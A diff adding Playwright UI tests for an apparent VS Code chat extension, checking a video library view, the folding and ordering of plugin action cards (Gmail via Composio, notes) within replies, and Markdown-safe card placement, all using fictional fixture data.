+    assert.deepEqual(await s.page.locator(".cd-video-card .video-actions button").allTextContents(), ["Open", "Show in folder", "Save to project…"]);
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+});
+
+test("the Library's Videos (0.51): every video DGC made, by where it was made, each to play here or open", async (t) => {
+  if (skipOrFail(t)) return;
+  const { html, js } = libraryHtml();
+  const player = readFileSync(join(root, "media/videoPlayer.js"), "utf8");
+  const page = await browser.newPage({ viewport: { width: 900, height: 700 } });
+  const errors = [];
+  page.on("pageerror", (error) => errors.push(String(error)));
+  try {
+    await page.setContent(html, { waitUntil: "load" });
+    await page.evaluate(([p, code]) => {
+      window.__posted = []; window.__state = undefined;
+      window.acquireVsCodeApi = () => ({ postMessage: (m) => window.__posted.push(m), getState: () => window.__state, setState(s) { window.__state = s; } });
+      eval(p); eval(code);
+    }, [player, js]);
+    const send = (d) => page.evaluate((x) => window.dispatchEvent(new MessageEvent("message", { data: x })), d);
+    const posted = (type) => page.evaluate((t) => window.__posted.filter((m) => m.type === t), type);
+    await send({ type: "videosOffered", on: true });
+    await page.locator(".lib-view", { hasText: "Videos" }).click();
+    // Each request carries its own sequence number, so a late reply to an older search is ignored.
+    const unseq = (m) => { assert.equal(typeof m.seq, "number", "a Library request carries its sequence"); const { seq, ...rest } = m; return rest; };
+    assert.deepEqual((await posted("videoList")).map(unseq), [{ type: "videoList", query: "", offset: 0 }]);
+    const today = new Date().toISOString();
+    // The host echoes the request's sequence; a reply without it would be an answer to an older search.
+    await send({ type: "videos", seq: (await posted("videoList")).at(-1).seq, offset: 0, total: 2, next: null, counts: { work: 1, chat: 1, pip: 0 }, videos: [
+      { path: "/home/me/.dgc/videos/sessions/s1/a-felt-ball.mp4", prompt: "a felt ball rolls", seconds: 5, width: 1280, height: 720,
+        bytes: 2100000, generator_name: "fal Wan 2.2 5B", surface: "work", created_at: today, job: "vid_0123456789ab" },
+      { path: "/home/me/.dgc/videos/chats/c/waves.mp4", prompt: "waves at dusk", seconds: 8, surface: "chat", created_at: today }] });
+    assert.deepEqual(await page.locator(".lib-video .lib-name").allTextContents(), ["a felt ball rolls", "waves at dusk"]);
+    assert.equal(await page.locator(".lib-video .lib-meta").first().textContent(), "5 s · 1280×720 · 2.0 MB · fal Wan 2.2 5B · made in Work · Today");
+    assert.deepEqual(await page.locator("#lib-made .lib-kind span:first-child").allTextContents(), ["Anywhere", "Work", "ChatDGC"],
+      "filters by where it was made (none from Pips yet, so no Pips chip)");
+    await page.locator("#lib-made .lib-kind", { hasText: "Work" }).click();
+    assert.deepEqual(unseq((await posted("videoList")).at(-1)), { type: "videoList", query: "", offset: 0, surface: "work" });
+    await send({ type: "videos", seq: (await posted("videoList")).at(-1).seq, offset: 0, total: 1, next: null, videos: [{ path: "/home/me/.dgc/videos/sessions/s1/a-felt-ball.mp4",
+      prompt: "a felt ball rolls", seconds: 5, surface: "work", created_at: today, job: "vid_0123456789ab" }] });
+    await page.locator(".lib-video .lib-action[title='Play it here']").click();
+    assert.equal(await page.locator(".lib-video figure.made-video video").count(), 1, "played here, with the shared player");
+    assert.equal((await posted("videoData"))[0].path, "/home/me/.dgc/videos/sessions/s1/a-felt-ball.mp4");
+    await page.locator(".lib-video .lib-action[title='Open it in your player']").click();
+    assert.equal((await posted("videoOpen"))[0].path, "/home/me/.dgc/videos/sessions/s1/a-felt-ball.mp4");
+    assert.deepEqual(errors, []);
+  } finally { await page.close(); }
+});
+
+// ---- plugin cards where they happened in the reply, folded once they're finished (0.51: "these Cards should act as
+// tool calls, like accepting it, should collapse that card like tool calls"). The reply of the report: Gmail's fetch
+// through Composio made at 44, the model's summary after it, a note saved at 1193, and a card that still waits.
+const CARD = (c) => "act_" + c.repeat(32);
+const APP = "app_" + "c".repeat(24);
+function inboxReply() {
+  const first = "I'll fetch your last five emails from Gmail.";
+  const intro = "\n\nHere are your last five emails, newest first:\n\n";
+  const items = ["**Ana Ruiz** · Lunch on Friday? She suggests the river café at 13:00 and asks whether Tom can join.",
+    "**Bank of Goa** · Your statement for October is ready. Nothing is due; the balance is unchanged from September.",
+    "**GitHub** · A pull request was merged into the garden repository: the watering schedule now skips rainy days.",
+    "**Tom Lee** · The seed order shipped. Tracking says it arrives on Thursday; he left the receipt in the thread.",
+    "**Calendar** · Reminder: the plot committee meets on Saturday at 10:00 in the community hall, bring the minutes."];
+  const tail = "\n\nI'll save this summary to your notes so it's there later.";
+  let list = items.map((item, i) => `${i + 1}. ${item}`).join("\n");
+  const room = 1193 - first.length - intro.length - tail.length - list.length;
+  assert.ok(room > 0, "room for the summary's words");
+  list = list.replace("minutes.", "minutes." + " The agenda is the shared shed, the compost rota and the spring planting plan.".repeat(9).slice(0, room));
+  const before = first + intro + list + tail;
+  assert.equal(first.length, 44);
+  assert.equal(before.length, 1193);
+  const after = "\n\nSaved: your summary is in Notes as “Inbox, 4 November”. Tom's seed receipt is in his thread; shall I file it too?";
+  const text = before + after;
+  const composio = { plugin: "composio", plugin_name: "Composio", money: false, server: "composio", tool: "COMPOSIO_MULTI_EXECUTE_TOOL",
+    arguments: { tools: [{ tool_slug: "GMAIL_FETCH_EMAILS", arguments: { max_results: 5, label_ids: ["INBOX"] } }], session_id: "sess_1" },
+    recurring: false, status: "done", at: 44, answer: '{"data":{"messages":[{"subject":"Lunch on Friday?","from":"Ana Ruiz"}]}}',
+    created_at: "2026-11-04T09:00:01.250Z", decided_at: "2026-11-04T09:00:09.900Z", id: CARD("1") };
+  const note = { plugin: "notes", plugin_name: "Notes (test)", money: false, server: "notes", tool: "save_note",
+    arguments: { title: "Inbox, 4 November", body: "Ana: lunch Friday 13:00. Seeds arrive Thursday.", tags: ["inbox"] },
+    recurring: false, status: "done", at: 1193, answer: '{"saved":true,"id":"note_7"}',
+    created_at: "2026-11-04T09:00:20.100Z", decided_at: "2026-11-04T09:00:31.400Z", id: CARD("2") };
+  const waiting = { ...note, id: CARD("3"), status: "waiting", at: text.length, answer: undefined, decided_at: undefined,
+    created_at: "2026-11-04T09:00:40.000Z", arguments: { title: "Seed receipt", body: "Tom's seed order receipt, from his thread.", tags: ["receipts"] } };
+  const message = { id: M(2), role: "assistant", text, finish: "stop", model: "deepseek-v4.1-flash:cloud", actions: [composio, note, waiting],
+    apps: [{ card_id: APP, server: "notes", plugin: "Notes (test)", tool: "save_note", call_id: null, created_at: "2026-11-04T09:00:30Z" }],
+    plugins: [{ plugin: "composio", name: "Composio" }, { plugin: "notes", name: "Notes (test)" }] };
+  return { message, first, before, after, text };
+}
+/** A reply's parts as drawn, in order: words (their first words), a folded row, a card, the Used line. */
+const replyOrder = (page) => page.evaluate(() => [...document.querySelectorAll(".cd-assistant > *")].map((n) =>
+  n.matches(".cd-body") ? `words: ${n.textContent.replace(/\s+/g, " ").trim().slice(0, 24).trim()}`
+  : n.matches(".cd-cardrow") ? `row: ${n.querySelector(".cd-cardrow-toggle").getAttribute("aria-label")}`
+  : n.matches(".cd-card") ? `card: ${n.dataset.action.slice(4, 5)} ${n.dataset.status}`
+  : n.matches(".cd-plugins-used") ? `used: ${n.textContent.replace(/\s+/g, " ").trim()}` : null).filter(Boolean));
+const INBOX_ORDER = [
+  "words: I'll fetch your last fiv",
+  "row: Gmail · Fetch emails · Done, show details",
+  "words: Here are your last five",
+  "row: Notes (test) · Save note · Done, show details",
+  "words: Saved: your summary is i",
+  "card: 1 waiting".replace("1", "3"),
+  "used: Used Composio, Notes (test)"];
+
+test("plugin cards sit where they happened in the reply, and a finished one folds to a row like Work's tool steps (0.51)", async (t) => {
+  if (skipOrFail(t)) return;
+  const { message, first } = inboxReply();
+  const opened = { type: "opened", conversation: conversation({ title: "Summarise Last Five Gmail Emails" }), earlier: 0, busy: false,
+                   messages: [{ id: M(1), role: "user", text: "Summarise my last five Gmail emails" }, message] };
+  const s = await openScreen({ height: 1400 });
+  try {
+    await s.send(opened);
+    await s.frame();
+    assert.deepEqual(await replyOrder(s.page), INBOX_ORDER, "the words, the card made there, the words after it, and so on");
+    assert.equal((await s.page.locator(".cd-assistant > .cd-body").first().textContent()).trim(), first, "the first words end where the card was made");
+    // Folded: one row each, a button that says what it is and how it went; the card itself is under it, closed.
+    const row = (c) => s.page.locator(`.cd-cardrow[data-card-row="${CARD(c)}"]`);
+    const toggle = (c) => row(c).locator(".cd-cardrow-toggle");
+    for (const c of ["1", "2"]) {
+      assert.equal(await toggle(c).getAttribute("aria-expanded"), "false");
+      assert.equal(await toggle(c).evaluate((b) => b.tagName), "BUTTON");
+      assert.equal(await shown(s.page, `.cd-card[data-action="${CARD(c)}"]`), false, "its card is folded away");
+      assert.equal(await toggle(c).getAttribute("aria-controls"), `cd-card-${CARD(c)}`);
+    }
+    assert.deepEqual(await toggle("1").locator(".cd-cardrow-what, .cd-cardrow-state").allTextContents(), ["Gmail · Fetch emails", "Done"]);
+    assert.equal(await toggle("1").locator(".cd-card-mark").count(), 1, "its plugin's mark, as the card wears it");
+    const height = (await row("1").boundingBox()).height;
+    assert.ok(height < 40, `one short line (${height}px)`);
+    // The card that waits stays open, with its buttons.
+    const waiting = s.page.locator(`.cd-card[data-action="${CARD("3")}"]`);
+    assert.equal(await waiting.isVisible(), true);
+    assert.equal(await s.page.locator(`.cd-cardrow[data-card-row="${CARD("3")}"]`).count(), 0, "a card that waits is never a row");
+    assert.deepEqual(await waiting.locator(".cd-card-actions button").allTextContents(), ["Send it now", "Hand it to a Pip", "Edit", "Don't"]);
+    // The MCP App card the note's action showed is in that card, not above the reply.
+    assert.equal(await s.page.locator(`.cd-card[data-action="${CARD("2")}"] .mcp-app-slot[data-card-id="${APP}"]`).count(), 1);
+    assert.equal(await s.page.locator(".cd-assistant > .cd-apps").count(), 0);
+    if (process.env.DGC_SHOTS) await s.page.screenshot({ path: join(process.env.DGC_SHOTS, "chatdgc-cards-in-order-folded.png"), fullPage: true });
+    // A click opens it: the inputs as sent, what came back (in sight), and the row says it can fold again.
+    await toggle("1").click();
+    assert.equal(await toggle("1").getAttribute("aria-expanded"), "true");
+    assert.equal(await toggle("1").getAttribute("aria-label"), "Gmail · Fetch emails · Done, hide details");
+    const card1 = s.page.locator(`.cd-card[data-action="${CARD("1")}"]`);
+    assert.equal(await card1.isVisible(), true);
+    assert.deepEqual(await card1.locator(".cd-card-calls .cd-call-line").allTextContents(), ["Gmail · Fetch emails · 5 from Inbox · through Composio"]);
+    assert.equal(await card1.locator(".cd-card-sent > summary").textContent(), "Inputs as sent");
+    assert.equal(await card1.locator(".cd-card-status").textContent(), "Done.");
+    assert.equal(await card1.locator(".cd-card-answer > summary").textContent(), "What Composio answered");
+    assert.equal(await card1.locator(".cd-card-answer pre").isVisible(), true, "what it answered, with no second click");
+    assert.equal(await card1.locator(".cd-card-head").isVisible(), false, "the row is its head: not said twice");
+    if (process.env.DGC_SHOTS) await s.page.screenshot({ path: join(process.env.DGC_SHOTS, "chatdgc-cards-row-open.png"), fullPage: true });
+    // The keys: it is a button, so Enter and Space fold and open it, and the focus stays on it.
+    await toggle("1").focus();
+    await s.page.keyboard.press("Enter");
+    assert.equal(await toggle("1").getAttribute("aria-expanded"), "false");
+    assert.equal(await card1.isVisible(), false);
+    await s.page.keyboard.press("Space");
+    assert.equal(await toggle("1").getAttribute("aria-expanded"), "true");
+    assert.equal(await s.page.evaluate(() => document.activeElement?.className), "cd-cardrow-toggle");
+    await s.page.keyboard.press("Space");
+    assert.equal(await card1.isVisible(), false);
+    assert.deepEqual(await replyOrder(s.page), INBOX_ORDER, "opening and folding moves nothing");
+    // The chat opened again draws it the same way.
+    await s.send({ type: "opened", conversation: conversation({ id: `chat_${"b".repeat(32)}`, title: "Other" }), earlier: 0, busy: false, messages: [] });
+    await s.send(opened);
+    await s.frame();
+    assert.deepEqual(await replyOrder(s.page), INBOX_ORDER, "opened again: the same order, folded");
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+  // A window reload: a new page, the chat as saved.
+  const again = await openScreen({ height: 1400 });
+  try {
+    await again.send(opened);
+    await again.frame();
+    assert.deepEqual(await replyOrder(again.page), INBOX_ORDER, "after a reload: the same order, folded");
+    assert.equal(await again.page.locator(`.cd-cardrow[data-card-row="${CARD("1")}"] .cd-cardrow-toggle`).getAttribute("aria-expanded"), "false");
+    assert.equal(await again.page.locator(`.cd-card[data-action="${CARD("3")}"]`).isVisible(), true, "the waiting card, open");
+    assert.deepEqual(again.errors, []);
+  } finally { await again.page.close(); }
+});
+
+test("Send it now: the card folds where it was made, and what the model goes on to write comes after it (0.51)", async (t) => {
+  if (skipOrFail(t)) return;
+  const s = await openScreen({ height: 1000 });
+  try {
+    const first = "I'll save that to your notes.";
+    const card = { plugin: "notes", plugin_name: "Notes (test)", money: false, server: "notes", tool: "save_note",
+      arguments: { title: "Hose", body: "Move the hose to bed 3 on Sunday." }, recurring: false, status: "waiting",
+      at: first.length, created_at: "2026-11-04T09:10:00.000Z", id: CARD("4") };
+    await s.send({ type: "opened", conversation: conversation({ title: "Notes" }), earlier: 0, busy: false, messages: [
+      { id: M(1), role: "user", text: "Note: move the hose to bed 3 on Sunday" },
+      { id: M(2), role: "assistant", text: first + "\n\n", finish: "stop", actions: [card], plugins: [{ plugin: "notes", name: "Notes (test)" }] }] });
+    await s.frame();
+    assert.deepEqual(await replyOrder(s.page), ["words: I'll save that to your n", "card: 4 waiting", "used: Used Notes (test)"]);
+    await s.page.locator(`.cd-card[data-action="${CARD("4")}"] button`, { hasText: "Send it now" }).click();
+    await s.frame();
+    assert.deepEqual(await s.posted("actionRun"), [{ type: "actionRun", messageId: M(2), actionId: CARD("4") }]);
+    assert.equal(await s.page.locator(`.cd-card[data-action="${CARD("4")}"] button`, { hasText: "Sending…" }).isDisabled(), true);
+    // Done: it folds in place; then the reply goes on (0.51 "carry on after a card"), and its words come after the row.
+    await s.send({ type: "action", messageId: M(2), action: { ...card, status: "done", answer: '{"saved":true}', decided_at: "2026-11-04T09:10:05.000Z" } });
+    await s.frame();
+    assert.deepEqual(await replyOrder(s.page), ["words: I'll save that to your n", "row: Notes (test) · Save note · Done, show details",
+                                                "used: Used Notes (test)"]);
+    await s.send({ type: "turn", state: "started", replyId: M(2) });
+    for (const part of ["Saved: ", "“Hose” is in your notes", " for Sunday."]) await s.send({ type: "delta", messageId: M(2), text: part });
+    await s.frame();
+    const rowNode = await s.page.locator(".cd-cardrow").elementHandle();
+    await s.send({ type: "delta", messageId: M(2), text: " Anything else?" });
+    await s.frame();
+    assert.equal(await rowNode.evaluate((n) => n.isConnected), true, "the row is the same node while the words come");
+    assert.deepEqual((await replyOrder(s.page)).slice(0, 3), ["words: I'll save that to your n", "row: Notes (test) · Save note · Done, show details",
+                                                              "words: Saved: “Hose” is in your"]);
+    await s.send({ type: "turn", state: "finished" });
+    await s.frame();
+    assert.deepEqual(await replyOrder(s.page), ["words: I'll save that to your n", "row: Notes (test) · Save note · Done, show details",
+                                                "words: Saved: “Hose” is in your", "used: Used Notes (test)"]);
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+});
+
+test("a card's place never cuts the reply's Markdown: inside a code fence or a list it goes after that block (0.51)", async (t) => {
+  if (skipOrFail(t)) return;
+  const s = await openScreen();
+  try {
+    const card = (c, at, status = "done") => ({ plugin: "notes", plugin_name: "Notes (test)", money: false, server: "notes", tool: "save_note",
+      arguments: { title: "t" }, recurring: false, status, at, answer: "ok", id: CARD(c) });
+    const fence = "Here is the script:\n\n```python\nprint('one')\nprint('two')\n```\n\nThen the list:\n\n1. Water the beans\n2. Thin the carrots\n\n3. Weed bed 3\n\nAnd the end. 🌱 Done.";
+    const inFence = fence.indexOf("print('two')"), inList = fence.indexOf("2. Thin"), emoji = [...fence].indexOf("D");
+    await s.send({ type: "opened", conversation: conversation({ title: "Blocks" }), earlier: 0, busy: false, messages: [
+      { id: M(1), role: "user", text: "Plan" },
+      { id: M(2), role: "assistant", text: fence, finish: "stop",
+        actions: [card("5", inFence), card("6", inList), card("7", emoji), card("8", fence.length + 40), card("9", undefined)] }] });
+    await s.frame();
+    const order = await s.page.evaluate(() => [...document.querySelectorAll(".cd-assistant > *")].map((n) =>
+      n.matches(".cd-body") ? `words: ${n.textContent.replace(/\s+/g, " ").trim()}` : n.matches(".cd-cardrow") ? `row ${n.dataset.cardRow.slice(4, 5)}` : null).filter(Boolean));
+    assert.deepEqual(order, [
+      "words: Here is the script: pythonprint('one') print('two')",
+      "row 5",
+      "words: Then the list: Water the beans Thin the carrots Weed bed 3",
+      "row 6",
+      "words: And the end. 🌱",
+      "row 7",
+      "words: Done.",
+      "row 8", "row 9"], "a fence and a list stay whole; an emoji counts as one character, as the backend counts it; no place or past the end: last");
+    assert.equal(await s.page.locator(".cd-assistant pre code, .cd-assistant pre").first().evaluate((n) => n.textContent.includes("print('two')")), true,
+                 "the code stays one block");
+    assert.deepEqual((await s.page.locator(".cd-assistant ol li").allTextContents()).map((x) => x.trim()), ["Water the beans", "Thin the carrots", "Weed bed 3"], "one list, numbered 1 to 3");
     assert.deepEqual(s.errors, []);
   } finally { await s.page.close(); }
 });
